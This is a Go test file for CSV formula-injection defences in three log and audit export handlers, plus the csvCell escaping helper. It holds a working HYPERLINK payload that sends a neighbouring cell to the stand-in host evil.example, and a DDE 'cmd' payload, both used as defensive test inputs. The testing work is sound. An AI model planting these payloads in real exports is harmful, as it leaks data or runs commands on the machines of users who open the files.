package handler

// csv_cell_test.go — cycle-13 L8. CSV formula injection: a spreadsheet
// evaluates any cell whose first character is one of = + - @ TAB CR, so a
// value an attacker controls (a token name, an audit details blob, a
// username) becomes code the moment a finance or compliance reader opens the
// export. encoding/csv quoting does not help — it protects the CSV grammar,
// not the spreadsheet's formula parser.
//
// Three exports write attacker-influenced text: ExportLogsV2
// (v2_log_export.go), ExportAdminLogsV2 (v2_log_export_admin.go) and
// writeAuditEventsCSV (v2_admin_audit.go). Each gets its own case below so
// that dropping the escape from ONE of them cannot hide behind the other
// two.

import (
	"encoding/csv"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/LurusTech/lurus-hub/internal/domain/entity"
)

// csvFormulaPayload is what an attacker puts in a field they control. It is
// a real, working spreadsheet formula: opened in Excel or LibreOffice it
// renders a link that exfiltrates the neighbouring cell.
const csvFormulaPayload = `=HYPERLINK("https://evil.example/?x="&A1,"click")`

// readCSVRecords parses a recorded CSV response, failing the test if the
// body is not well-formed CSV.
func readCSVRecords(t *testing.T, w *httptest.ResponseRecorder) [][]string {
	t.Helper()
	records, err := csv.NewReader(strings.NewReader(w.Body.String())).ReadAll()
	if err != nil {
		t.Fatalf("parse csv: %v — raw: %s", err, w.Body.String())
	}
	return records
}

// assertNeutralised checks one cell of one row: it must still carry the
// payload (the export is not allowed to silently drop data) and it must no
// longer start with a formula trigger.
func assertNeutralised(t *testing.T, where string, cell string) {
	t.Helper()
	if !strings.Contains(cell, "HYPERLINK") {
		t.Fatalf("%s = %q — the payload is missing entirely; the export must neutralise the cell, not drop it", where, cell)
	}
	if !strings.HasPrefix(cell, "'") {
		t.Errorf("%s = %q — a cell starting with '=' is evaluated as a formula when the export is opened; it must be prefixed with a single quote", where, cell)
	}
}

// TestExportLogsV2_EscapesFormulaCell drives the real GET
// /api/v2/:tenant_slug/logs/export handler over a real sqlite-backed log row
// whose token_name is a formula.
func TestExportLogsV2_EscapesFormulaCell(t *testing.T) {
	ctx := setupLogExportRouter(t)

	seedExportLog(t, ctx, "gpt-4o", csvFormulaPayload, int64(1_700_000_000))

	w := doExportGet(ctx, ctx.tenantSlug, "", "")
	if w.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200; body=%s", w.Code, w.Body.String())
	}

	records := readCSVRecords(t, w)
	if len(records) != 2 {
		t.Fatalf("records = %d (header + rows), want 2; raw: %s", len(records), w.Body.String())
	}
	tokenNameCol := -1
	for i, h := range records[0] {
		if h == "token_name" {
			tokenNameCol = i
		}
	}
	if tokenNameCol < 0 {
		t.Fatalf("header %v has no token_name column", records[0])
	}
	assertNeutralised(t, "logs/export token_name", records[1][tokenNameCol])
}

// TestExportAdminLogsV2_EscapesFormulaCell: the root-only usage report.
// username AND token_name are both attacker-influenced here (a tenant user
// picks both), so both are asserted. setupAdminLogExportRouter /
// seedAdminExportLog come from v2_log_export_admin_test.go (same package) —
// the fixture that already mounts this route against a sqlite repo.LOG_DB.
func TestExportAdminLogsV2_EscapesFormulaCell(t *testing.T) {
	ctx := setupAdminLogExportRouter(t)
	defer ctx.cleanup()

	seedAdminExportLog(t, ctx.db, &entity.Log{
		UserId:    3,
		TenantId:  "test-tenant",
		Type:      entity.LogTypeConsume,
		ModelName: "gpt-4o",
		Username:  csvFormulaPayload,
		TokenName: csvFormulaPayload,
		Quota:     500,
		CreatedAt: int64(1_700_000_000),
	})

	req := httptest.NewRequest(http.MethodGet, "/api/v2/admin/logs/export?format=csv", nil)
	w := httptest.NewRecorder()
	ctx.router.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200; body=%s", w.Code, w.Body.String())
	}

	records := readCSVRecords(t, w)
	if len(records) != 2 {
		t.Fatalf("records = %d (header + rows), want 2; raw: %s", len(records), w.Body.String())
	}
	for _, col := range []string{"username", "token_name"} {
		idx := -1
		for i, h := range records[0] {
			if h == col {
				idx = i
			}
		}
		if idx < 0 {
			t.Fatalf("header %v has no %s column", records[0], col)
		}
		assertNeutralised(t, "admin/logs/export "+col, records[1][idx])
	}
}

// TestExportAuditEventsV2_EscapesFormulaCell: the compliance export. The
// details blob is JSON assembled from request data, so it is the cell an
// attacker reaches.
func TestExportAuditEventsV2_EscapesFormulaCell(t *testing.T) {
	ctx := setupAuditExportRouter(t)
	defer ctx.cleanup()

	ev := &entity.AuditEvent{
		TenantID:  "test-tenant",
		Timestamp: 1_700_000_000,
		ActorType: "admin",
		ActorID:   1,
		Action:    "auth.login_success",
		Resource:  "user",
		Details:   csvFormulaPayload,
	}
	if err := ctx.db.Create(ev).Error; err != nil {
		t.Fatalf("seed audit event: %v", err)
	}

	req := httptest.NewRequest(http.MethodGet, "/api/v2/admin/audit/export?format=csv", nil)
	w := httptest.NewRecorder()
	ctx.router.ServeHTTP(w, req)
	if w.Code != http.StatusOK {
		t.Fatalf("status = %d, want 200; body=%s", w.Code, w.Body.String())
	}

	records := readCSVRecords(t, w)
	if len(records) != 2 {
		t.Fatalf("records = %d (header + rows), want 2; raw: %s", len(records), w.Body.String())
	}
	idx := -1
	for i, h := range records[0] {
		if h == "details" {
			idx = i
		}
	}
	if idx < 0 {
		t.Fatalf("header %v has no details column", records[0])
	}
	assertNeutralised(t, "audit/export details", records[1][idx])
}

// TestCSVCell_Table is the helper's own contract: which first characters
// trigger the prefix, and — just as important — which do not, so the escape
// cannot quietly grow into "quote everything".
func TestCSVCell_Table(t *testing.T) {
	cases := []struct {
		name string
		in   string
		want string
	}{
		{"equals", "=1+1", "'=1+1"},
		{"plus", "+1", "'+1"},
		{"at", "@SUM(A1)", "'@SUM(A1)"},
		{"tab", "\t=1+1", "'\t=1+1"},
		{"carriage_return", "\r=1+1", "'\r=1+1"},
		{"hyperlink_payload", csvFormulaPayload, "'" + csvFormulaPayload},
		// A leading '-' is a trigger too: "-1+1+cmd|' /C calc'!A0" is a live
		// formula. The cost of covering it is the row below it.
		{"minus_formula", "-1+1+cmd|' /C calc'!A0", "'-1+1+cmd|' /C calc'!A0"},
		{"negative_number_is_also_prefixed", "-500", "'-500"},
		// Untouched: ordinary data must survive the export unchanged, or a
		// finance reader gets a column of quoted strings instead of values.
		{"empty", "", ""},
		{"plain_text", "my-token", "my-token"},
		{"positive_number", "500", "500"},
		{"iso_timestamp", "2026-09-20T05:00:00Z", "2026-09-20T05:00:00Z"},
		{"quoted_comma_text", `tok "quoted", with comma`, `tok "quoted", with comma`},
		{"trigger_not_first", "a=1+1", "a=1+1"},
		{"leading_space", " =1+1", " =1+1"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := csvCell(tc.in); got != tc.want {
				t.Errorf("csvCell(%q) = %q, want %q", tc.in, got, tc.want)
			}
		})
	}
}

// TestCSVRow_AppliesToEveryCell: the escape must not be a first-cell-only
// habit — a formula in the LAST column is evaluated exactly the same way.
func TestCSVRow_AppliesToEveryCell(t *testing.T) {
	got := csvRow("plain", "=1+1", "also-plain", "@SUM(A1)")
	want := []string{"plain", "'=1+1", "also-plain", "'@SUM(A1)"}
	if len(got) != len(want) {
		t.Fatalf("csvRow returned %d cells, want %d", len(got), len(want))
	}
	for i := range want {
		if got[i] != want[i] {
			t.Errorf("cell %d = %q, want %q", i, got[i], want[i])
		}
	}
}
